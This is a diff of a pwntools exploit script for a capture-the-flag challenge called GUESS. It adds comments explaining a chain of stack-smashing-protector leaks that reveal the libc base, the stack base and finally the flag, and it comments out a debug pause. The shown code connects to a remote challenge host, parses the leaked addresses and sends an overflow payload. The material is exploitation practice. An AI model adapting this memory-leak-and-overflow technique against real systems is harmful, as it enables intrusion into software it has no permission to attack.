@@ -1,3 +1,6 @@
+# Use stacksmash & .got.plt to leak libc_base ;
+# Use stacksmash & environ in libc to leak stack_base ;
+# Use stacksmash & flag_addr to leak flag .
 from pwn import *
 #r=process('./GUESS')
 r=remote('106.75.90.160',9999)
@@ -21,7 +24,7 @@ r.recvuntil(': ')
 leak3=r.recv(6).strip().ljust(8,'\x00')
 stack=u64(leak3)-416
 log.success('stack_base:'+str(hex(stack)))
-raw_input()
+#raw_input()
 
 r.recvuntil('flag\n')
 r.sendline('a'*296+p64(stack+0x38))
